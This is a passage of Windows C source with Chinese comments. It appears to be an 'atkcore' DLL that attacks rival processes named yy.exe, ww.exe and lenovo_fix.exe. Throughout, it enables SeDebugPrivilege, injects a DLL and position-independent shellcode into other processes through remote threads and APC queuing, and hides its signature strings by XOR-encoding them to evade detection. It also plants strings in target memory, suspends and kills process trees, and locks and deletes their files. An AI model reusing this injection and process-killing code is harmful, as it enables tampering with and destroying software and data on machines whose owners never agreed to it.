            WriteKillLog(L"占住蜜罐文件名失败: %s err=%lu", path, GetLastError());
        }
        return;
    }
    WriteKillLog(L"已把蜜罐文件换成 0 字节占位并独占锁住（yy 复制不进来、也起不来）: %s", path);
}

/* 按**进程名**点名清一遍蜜罐：不依赖家族收集（父进程链被我们打断时也能命中） */
static void KillHoneypotPass(void)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int n = 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR path[MAX_PATH] = L"";
            if (pe.th32ProcessID <= 4 || pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (_wcsicmp(pe.szExeFile, L"lenovo_fix.exe") != 0) continue;
            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
            WriteKillLog(L"蜜罐命中：PID=%lu %s -> 杀掉 + 锁死删除源文件", pe.th32ProcessID, path);
            { HWND w = FindYyPopupOf(pe.th32ProcessID); if (w) FastKillYyWindow(w, L"蜜罐"); }
            TryAllMethods(L"lenovo_fix.exe", pe.th32ProcessID);
            if (path[0]) LockThenDeleteFile(path);
            n++;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (n) WriteKillLog(L"蜜罐本轮处理 %d 个实例（复活源已被锁住则不会再出现）", n);
}
/* ============================================================================
   本体杀伐的唯一出口：**发现即杀**（嘲讽那块已按用户要求删除）。
     · 先把它那个窗口就地打死：A2 = 终止持有窗口的 GUI 线程，IsWindow 立刻变 0，
       宿主进程还活着也没关系 —— 弹窗消失 8 秒就是它输，先保证这一点；
     · 再结束整棵进程树，每个进程的源文件"先锁死（删除待决）再删除"，
       根进程的目录整目录清空（系统临时目录除外，见 WipeDirPass）。
   Phase A（扫描）与 Phase C（抓复活）都走这里，避免两处判据不一致。
   ============================================================================ */
static void KillYyBody(DWORD pid, LPCWSTR why)
{
    WriteKillLog(L"结束 yy 本体 PID=%lu 的进程树并锁死删除源文件（%s）",
                 pid, why ? why : L"");
    { HWND w = FindYyPopupOf(pid); if (w) FastKillYyWindow(w, L"本体"); }
    KillProcessTree(pid);
}

/* 宿主的可执行文件名（我们自己所在进程）；以及"是不是 yy/ww 本体" */
static void HostLeafName(WCHAR *out, SIZE_T cch)
{
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *base = L"";
    if (!out || !cch) return;
    out[0] = L'\0';
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    wcsncpy_s(out, cch, base, _TRUNCATE);
}

static BOOL IsYyCoreName(LPCWSTR leaf)
{
    return leaf && (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0);
}

/* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
    它们走子进程策略，不当"感染宿主"。 */
static BOOL HostIsTargetExe(void)
{
    WCHAR leaf[MAX_PATH] = L"";
    HostLeafName(leaf, MAX_PATH);
    return IsYyCoreName(leaf);
}

/* 这个窗口像不像 yy 的弹窗（类名 YYWnd* 或标题 YY_Defensive_GUI）。
   同进程内直接读类名/标题；跨进程也用它俩（类名跨进程可读）。 */
static BOOL IsYyPopupWindow(HWND h)
{
    WCHAR cls[128] = L"", title[192] = L"";
    if (!h || !IsWindow(h)) return FALSE;
    GetClassNameW(h, cls, _countof(cls));
    GetWindowTextW(h, title, _countof(title));
    if (wcsstr(cls, L"YYWnd")) return TRUE;
    if (wcscmp(title, L"YY_Defensive_GUI") == 0) return TRUE;
    return FALSE;
}

/* 在某进程里找 yy 的可见弹窗 */
static HWND FindYyPopupOf(DWORD pid)
{
    HWND h = GetTopWindow(NULL);
    while (h) {
        DWORD wpid = 0;
        GetWindowThreadProcessId(h, &wpid);
        if (wpid == pid && IsWindowVisible(h) && IsYyPopupWindow(h)) return h;
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return NULL;
}

/* 本进程里有没有 yy 弹窗 */
static HWND FindYyPopupInSelf(void) { return FindYyPopupOf(GetCurrentProcessId()); }

/* 内部函数声明 */
static BOOL KillByTerminate(DWORD pid);
static BOOL KillByRemoteExit(DWORD pid);
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath);
static BOOL KillByKillerBin(DWORD pid, BOOL useApc);
static BOOL KillByJobObject(DWORD pid);
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);
static void AttackPass(void);
/* ================== 反向利用 yy 的内存扫描：把特征串种进它自己的私有内存 ==================
   新 yy 会遍历各进程的 MEM_PRIVATE 可读内存，找 `XX PROGRAM - ALIVE` / `xx_wg_` /
   `xxres.bin` 三个串，命中就 TerminateProcess。那就把这些串**写进 yy 进程自己的私有内存**：
   yy 扫到（自己或同伴）就自杀，比我们主动结束更省事、也更难被反制。
   关键：本文件里**不能有明文**（否则 atkcore 自己带着特征），所以用 XOR 密文 + 运行时解码，
   写入远端后立刻把本地缓冲清零。 */
static const unsigned char kSigTitleEnc[] = {
    0xFF,0xFF,0x87,0xF7,0xF5,0xE8,0xE0,0xF5,0xE6,0xEA,0x87,0x8A,0x87,0xE6,0xEB,0xEE,0xF1,0xE2
};
static const unsigned char kSigMutexEnc[] = { 0xDF,0xDF,0xF8,0xD0,0xC0,0xF8 };
static const unsigned char kSigBackupEnc[] = { 0xDF,0xDF,0xD5,0xC2,0xD4,0x89,0xC5,0xCE,0xC9 };

static void XorDecode(unsigned char *dst, const unsigned char *enc, int n)
{
    int i;
    for (i = 0; i < n; i++) dst[i] = (unsigned char)(enc[i] ^ 0xA7);
    dst[n] = 0;
}

/* 往一个目标进程里种一遍（每次新建一页私有内存，避免被它自己回收后失效） */
static BOOL PlantSignaturesInPid(DWORD pid)
{
    HANDLE hProc;
    unsigned char page[0x400];
    LPVOID remote;
    BOOL ok = FALSE;

    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                        FALSE, pid);
    if (!hProc) return FALSE;

    memset(page, 0, sizeof(page));
    XorDecode(page + 0x000, kSigTitleEnc,  sizeof(kSigTitleEnc));
    XorDecode(page + 0x100, kSigMutexEnc,  sizeof(kSigMutexEnc));
    XorDecode(page + 0x200, kSigBackupEnc, sizeof(kSigBackupEnc));

    remote = VirtualAllocEx(hProc, NULL, sizeof(page), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote) {
        SIZE_T wrote = 0;
        ok = WriteProcessMemory(hProc, remote, page, sizeof(page), &wrote) && wrote == sizeof(page);
        if (ok) {
            /* 加一层：把同一页的保护改成可读（PAGE_READWRITE 已经可读，这里只是显式化） */
            DWORD old = 0;
            VirtualProtectEx(hProc, remote, sizeof(page), PAGE_READWRITE, &old);
        }
    }
    SecureZeroMemory(page, sizeof(page));      /* 本地副本立刻抹掉，别留特征 */
    CloseHandle(hProc);
    return ok;
}

/* 遍历目标进程，逐个种特征（3 秒一轮，节流；只在拿到 leader 的那份实现里跑） */
static void PlantSignaturesInAllTargets(void)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    int planted = 0;

    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (!IsTargetName(pe.szExeFile)) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (PlantSignaturesInPid(pe.th32ProcessID)) {
                planted++;
                WriteKillLog(L"已把特征串种进目标私有内存 PID=%lu %ls（yy 自扫自灭）",
                             pe.th32ProcessID, pe.szExeFile);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (planted)
        WriteKillLog(L"本轮共向 %d 个目标进程植入特征串", planted);
}
static DWORD WINAPI AttackLoop(LPVOID lp);
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void LockImage(LPCWSTR path);
static void MaintainLocks(void);

/* 取真正的程序目录：注入副本是从 %TEMP% 的改名文件加载的，按自身模块路径
   会推到 %TEMP%，payload.dll / payload.bin 就都找不到了。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch)
{
    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        XXDirNameOf(XXPathBase(g_pSharedView, NULL), dir, cch);
        if (dir[0] != L'\0') return;
    }
    GetModuleFileNameW(g_hSelfModule ? g_hSelfModule : GetModuleHandleW(L"atkcore.dll"),
                       dir, (DWORD)cch);
    {
        WCHAR *pSlash = wcsrchr(dir, L'\\');
        if (pSlash) pSlash[1] = L'\0';
    }
}

/* 获取 payload.dll 路径（与 xx.exe 同目录） */
static void GetKillerPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.dll");
}

/* 获取 payload.bin 路径 */
static void GetKillerBinPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.bin");
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 导出：启动攻击 */
__declspec(dllexport) void WINAPI StartAttack(void)
{
    if (InterlockedCompareExchange(&g_bRunning, 1, 0) == 0)
    {
        BOOL bPriv = EnableDebugPrivilege();
        WriteKillLog(L"atkcore build=%ls 启动 PID=%lu SeDebug=%s（本行用于确认加载的是新 dll）",
                     L"v5 (kill-on-sight)", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
        g_hThread = CreateThread(NULL, 0, AttackLoop, NULL, 0, NULL);
    }
}

/* 导出：停止攻击 */
__declspec(dllexport) void WINAPI StopAttack(void)
{
    InterlockedExchange(&g_bRunning, 0);
    if (g_hThread)
    {
        WaitForSingleObject(g_hThread, 5000);
        CloseHandle(g_hThread);
        g_hThread = NULL;
        WriteKillLog(L"攻击线程停止");
    }
}

/* 方法1：TerminateProcess */
/* ================== B1/B3：一次 syscall 枚举 + 挂起式击杀 ==================
   "枚举有点慢"的根因：每轮都 CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)，
   那是内核把手，要把几十万字节的进程表复制两遍。改成
   NtQuerySystemInformation(SystemProcessInformation)：**一次 syscall 拿全部进程**。
   击杀用 NtSuspendProcess（先冻住，VEH/守护线程反应不过来）再 TerminateProcess。 */
typedef LONG (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *NtSuspendProcess_t)(HANDLE);
typedef LONG (NTAPI *NtTerminateProcess_t)(HANDLE, LONG);

#define XX_SYSTEM_PROCESS_INFORMATION 5
#define XX_MAX_PIDS 512

/* 自己定义 UNICODE_STRING，别依赖 winternl.h */
typedef struct _XX_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} XX_UNICODE_STRING;

typedef struct _XX_SPI_ENTRY {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    UCHAR Reserved1[48];
    XX_UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
} XX_SPI_ENTRY;

static int XXEnumProcessesFast(DWORD *pids, WCHAR (*names)[64], int maxPids)
{
    static NtQuerySystemInformation_t s_pQuery = NULL;
    static BOOL s_bTried = FALSE;
    ULONG size = 1 << 20, needed = 0;
    BYTE *buf;
    LONG st;
    int n = 0;

    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"ntdll.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"ntdll.dll");
        if (h) s_pQuery = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");
    }
    if (!s_pQuery || !pids || maxPids <= 0) return 0;

    buf = (BYTE *)malloc(size);
    if (!buf) return 0;
    for (;;) {
        st = s_pQuery(XX_SYSTEM_PROCESS_INFORMATION, buf, size, &needed);
        if (st == 0) break;
        free(buf);
        if (st != (LONG)0xC0000004L && st != (LONG)0x80000005L) return 0;
        size = needed ? needed + (64 << 10) : size * 2;
        if (size > (64u << 20)) return 0;
        buf = (BYTE *)malloc(size);
        if (!buf) return 0;
    }

    {
        BYTE *p = buf;
        for (;;) {
            XX_SPI_ENTRY *e = (XX_SPI_ENTRY *)p;
            DWORD pid = (DWORD)(ULONG_PTR)e->UniqueProcessId;
            if (pid && n < maxPids) {
                pids[n] = pid;
                if (names) {
                    names[n][0] = L'\0';
                    if (e->ImageName.Buffer && e->ImageName.Length > 0) {
                        int cch = e->ImageName.Length / (int)sizeof(WCHAR);
                        if (cch > 63) cch = 63;
                        memcpy(names[n], e->ImageName.Buffer, cch * sizeof(WCHAR));
                        names[n][cch] = L'\0';
                    }
                }
                n++;
            }
            if (e->NextEntryOffset == 0) break;
            p += e->NextEntryOffset;
        }
    }
    free(buf);
    return n;
}

/* 挂起 + 终止（B3）。先冻住再杀：对手的 VEH/守护线程来不及反应。
   **不再缓存句柄**：日志里"KillFast 成功 PID=6116"刷了 54 次，而 6116 就是写日志的
   进程自己 —— 缓存句柄一旦在别处被关掉，句柄值会被系统复用，下一次 TerminateProcess
   就打到**别的进程**（甚至自己）身上。每轮 OpenProcess 的成本远小于杀错一个进程。 */
static BOOL KillFast(DWORD pid)
{
    static NtSuspendProcess_t s_pSuspend = NULL;
    static NtTerminateProcess_t s_pTerminate = NULL;
    static BOOL s_bTried = FALSE;
    HANDLE hProc;
    BOOL ok = FALSE;

    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"ntdll.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"ntdll.dll");
        if (h) {
            s_pSuspend = (NtSuspendProcess_t)GetProcAddress(h, "NtSuspendProcess");
            s_pTerminate = (NtTerminateProcess_t)GetProcAddress(h, "NtTerminateProcess");
        }
    }
    if (!pid || pid <= 4 || pid == GetCurrentProcessId()) return FALSE;

    hProc = OpenProcess(PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME | SYNCHRONIZE, FALSE, pid);
    if (!hProc)
        hProc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
    if (!hProc) {
        WriteKillLog(L"KillFast 打不开 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    if (s_pSuspend) s_pSuspend(hProc);
    if (s_pTerminate) ok = (s_pTerminate(hProc, 0) == 0);
    else ok = TerminateProcess(hProc, 0);
    if (!ok) ok = TerminateProcess(hProc, 0);

    /* **必须等它真的退出**：日志里出现过"KillFast 成功"对同一个 PID 刷几十次，
       进程却还活着（TerminateProcess 是异步的，且目标被挂起后退出更慢）。
       不确认就报成功 = 自己骗自己，等于"看起来杀了、其实没杀"。 */
    if (ok) {
        DWORD w = WaitForSingleObject(hProc, 300);
        if (w == WAIT_OBJECT_0) {
            WriteKillLog(L"KillFast 成功（已确认退出）PID=%lu", pid);
        } else {
            WriteKillLog(L"KillFast 已下发但进程仍在 PID=%lu（等 300ms 超时）", pid);
            ok = FALSE;
        }
    } else {
        WriteKillLog(L"KillFast 失败 PID=%lu err=%lu", pid, GetLastError());
    }
    CloseHandle(hProc);
    return ok;
}

/* ================== A2 + A6：让 yy 的窗口**立刻**消失 ==================
   本轮实测结论：
     · A6 `NtUserDestroyWindow`（走 win32u.dll 导出，不写死 syscall 号）**跨进程无效**：
       返回 STATUS_SUCCESS(0) 但窗口依然存在 —— win32k 只认真属主进程。留着当无害尝试并记日志。
     · A2 `TerminateThread(持有该窗口的 GUI 线程)` **有效**：实测 300ms 内 IsWindow 变 0，
       宿主进程仍然活着。这是跨进程摧毁窗口唯一又快又可靠的手段
       （user32!DestroyWindow 跨进程必失败，你已踩过）。
   顺序：A6 试一次（记录）→ A2 无条件执行。 */
typedef LONG (WINAPI *NtUserDestroyWindow_t)(HWND);

static void FastKillYyWindow(HWND hWnd, LPCWSTR why)
{
    static NtUserDestroyWindow_t s_pNtUserDestroy = NULL;
    static BOOL s_bTried = FALSE;
    DWORD pid = 0, tid;
    HANDLE hTh;
    BOOL ok;

    if (!hWnd || !IsWindow(hWnd)) return;
    tid = GetWindowThreadProcessId(hWnd, &pid);
    if (!tid) return;

    if (!s_bTried) {
        HMODULE h = LoadLibraryW(L"win32u.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"user32.dll");
        if (h) s_pNtUserDestroy = (NtUserDestroyWindow_t)GetProcAddress(h, "NtUserDestroyWindow");
    }
    if (s_pNtUserDestroy) {
        LONG st = s_pNtUserDestroy(hWnd);
        WriteKillLog(L"A6 NtUserDestroyWindow(%ls) hwnd=%p 返回 0x%08lX，IsWindow=%d",
                     why ? why : L"", (void *)hWnd, (unsigned long)st, IsWindow(hWnd) ? 1 : 0);
    }
    if (!IsWindow(hWnd)) return;

    hTh = OpenThread(THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hTh) {
        WriteKillLog(L"A2 OpenThread 失败 tid=%lu err=%lu（退回杀进程 PID=%lu）",
                     tid, GetLastError(), pid);
        KillFast(pid);
        return;
    }
    ok = TerminateThread(hTh, 0);
    CloseHandle(hTh);
    if (ok) {
        Sleep(20);
        WriteKillLog(L"A2 已终止 yy 窗口线程 tid=%lu(%ls)，窗口消失=%d（PID=%lu 仍在）",
                     tid, why ? why : L"", IsWindow(hWnd) ? 0 : 1, pid);
    } else {
        WriteKillLog(L"A2 TerminateThread 失败 tid=%lu err=%lu（退回杀进程）", tid, GetLastError());
        KillFast(pid);
    }
}

static BOOL KillByTerminate(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc)
    {
        bResult = TerminateProcess(hProc, 0);
        CloseHandle(hProc);
        if (bResult)
            WriteKillLog(L"TerminateProcess 成功结束 PID=%lu", pid);
        else
            WriteKillLog(L"TerminateProcess 失败 PID=%lu err=%lu", pid, GetLastError());
    }
    else
    {
        WriteKillLog(L"TerminateProcess 打开失败 PID=%lu err=%lu", pid, GetLastError());
    }
    return bResult;
}

/* 方法2：CreateRemoteThread 直接跑 ExitProcess(0)
   与 TerminateProcess 走不同退出路径——它会正常执行各模块的 DLL_PROCESS_DETACH，
   可绕开"只拦 TerminateProcess"的防御。无需 VirtualAllocEx（不传字符串）。 */
static BOOL KillByRemoteExit(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"RemoteExit 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pExit = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "ExitProcess");
    if (!pExit)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pExit, (LPVOID)0, 0, NULL);
    if (!hThread)
    {
        WriteKillLog(L"RemoteExit 创建远程线程失败 PID=%lu err=%lu", pid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    CloseHandle(hProc);
    WriteKillLog(L"CreateRemoteThread+ExitProcess 成功 PID=%lu", pid);
    return TRUE;
}

/* 方法3：注入 payload.dll（让目标进程自行终止） */
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath)
{
    if (GetFileAttributesW(killerPath) == INVALID_FILE_ATTRIBUTES)
    {
        WriteKillLog(L"payload.dll 不存在: %s", killerPath);
        return FALSE;
    }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                               FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"payload.dll 注入打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    SIZE_T pathSize = (wcslen(killerPath) + 1) * sizeof(WCHAR);
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL bWrite = WriteProcessMemory(hProc, pRemote, killerPath, pathSize, NULL);
    if (!bWrite)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pRemote, 0, NULL);
    if (hRemote)
    {
        DWORD code = 0;
        WaitForSingleObject(hRemote, 3000);
        /* 远端线程退出码 = 宿主里 LoadLibraryW 的返回值（HMODULE）；
           成功了就把会话随机名推给它（方案 A：远程调用 XxSetNames，读完清零释放）。 */
        if (GetExitCodeThread(hRemote, &code) && code != 0)
            PushNamesRemote(hProc, (HMODULE)(ULONG_PTR)code, killerPath, pid);
        CloseHandle(hRemote);
    }
    else
    {
        WriteKillLog(L"注入 payload.dll 到 PID=%lu 失败 err=%lu", pid, GetLastError());
    }

    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

/* 方法3b：注入 payload.bin（位置无关 shellcode，可绕过签名检查） */
static BOOL KillByKillerBin(DWORD pid, BOOL useApc)
{
    WCHAR binPath[MAX_PATH];
    if (g_szPayloadBinCopy[0]) wcsncpy_s(binPath, MAX_PATH, g_szPayloadBinCopy, _TRUNCATE);
    else GetKillerBinPath(binPath, MAX_PATH);

    HANDLE hFile = CreateFileW(binPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        WriteKillLog(L"payload.bin 不存在: %s", binPath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 0x10000) { CloseHandle(hFile); return FALSE; }

    LPVOID pLocal = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, pLocal, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        CloseHandle(hFile); VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    CloseHandle(hFile);

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    if (!WriteProcessMemory(hProc, pRemote, pLocal, fileSize, NULL))
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL result = FALSE;
    int apcQueued = 0;

    if (useApc)
    {
        /* APC 注入：绕过 LoadLibrary 签名检查（直接执行已写入的代码） */
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap != INVALID_HANDLE_VALUE)
        {
            THREADENTRY32 te;
            te.dwSize = sizeof(te);
            if (Thread32First(hThreadSnap, &te))
            {
                do {
                    if (te.th32OwnerProcessID == pid)
                    {
                        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                        if (hThread)
                        {
                            if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0))
                            {
                                result = TRUE;
                                apcQueued++;
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hThreadSnap, &te));
            }
            CloseHandle(hThreadSnap);
        }
        WriteKillLog(L"APC 排队注入 PID=%lu 线程数=%d 结果=%s", pid, apcQueued, result ? L"成功" : L"失败");
    }

    if (!result)
    {
        /* 回退到 CreateRemoteThread */
        HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
        if (hRemote)
        {
            WaitForSingleObject(hRemote, 100);
            CloseHandle(hRemote);
            result = TRUE;
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 成功", pid);
        }
        else
        {
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 失败 err=%lu", pid, GetLastError());
        }
    }

    CloseHandle(hProc);
    VirtualFree(pLocal, 0, MEM_RELEASE);
    return result;
}

/* 方法4：Job 对象终止 */
static BOOL KillByJobObject(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"Job 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    // 设置 Job 信息：当 Job 中最后一个进程句柄关闭时终止所有进程
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)))
    {
        if (AssignProcessToJobObject(hJob, hProc))
        {
            // Job 已绑定，关闭 Job 句柄将终止进程（因为设置了 KILL_ON_JOB_CLOSE）
            // 但需要等待一小段时间让系统执行
            CloseHandle(hJob);   // 这会触发目标进程终止
            bResult = TRUE;
            WriteKillLog(L"Job 对象绑定成功 PID=%lu", pid);
        }
        else
        {
            WriteKillLog(L"Job 绑定失败 PID=%lu err=%lu", pid, GetLastError());
            CloseHandle(hJob);
        }
    }
    else
    {
        CloseHandle(hJob);
    }

    CloseHandle(hProc);
    return bResult;
}

static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch)
{
    path[0] = L'\0';
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    DWORD size = cch;
    BOOL ok = QueryFullProcessImageNameW(h, 0, path, &size);
    CloseHandle(h);
    return ok;
}

static void LockImage(LPCWSTR path)
{
    if (!path || !path[0]) return;
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (g_lockPaths[i][0] && _wcsicmp(g_lockPaths[i], path) == 0)
            return;
    }
    LONG slot = InterlockedIncrement(&g_nLocks) - 1;
    if (slot < 0 || slot >= MAX_LOCKS) { InterlockedDecrement(&g_nLocks); return; }
    wcsncpy(g_lockPaths[slot], path, MAX_PATH - 1);
    g_lockPaths[slot][MAX_PATH - 1] = L'\0';
    g_hLocks[slot] = NULL;
    WriteKillLog(L"记录镜像锁路径: %s", path);
}

static void MaintainLocks(void)
{
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (!g_lockPaths[i][0] || g_hLocks[i]) continue;
        HANDLE h = CreateFileW(g_lockPaths[i], 0, 0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE)
        {
            g_hLocks[i] = h;
            WriteKillLog(L"镜像锁获取成功: %s", g_lockPaths[i]);
        }
    }
}

static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid)
{
    WCHAR killerPath[MAX_PATH];
    if (g_szPayloadCopy[0]) wcsncpy_s(killerPath, MAX_PATH, g_szPayloadCopy, _TRUNCATE);
    else GetKillerPath(killerPath, MAX_PATH);

    BOOL bTarget = IsTargetName(exeName);
    const WCHAR *name = exeName ? exeName : L"unknown";

    /* 方法0（B3）：NtSuspendProcess 先冻住再 NtTerminateProcess —— 最快，也是 yy 对我们用的招 */
    if (KillFast(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (KillFast: 挂起+终止)", name, pid);
        return TRUE;
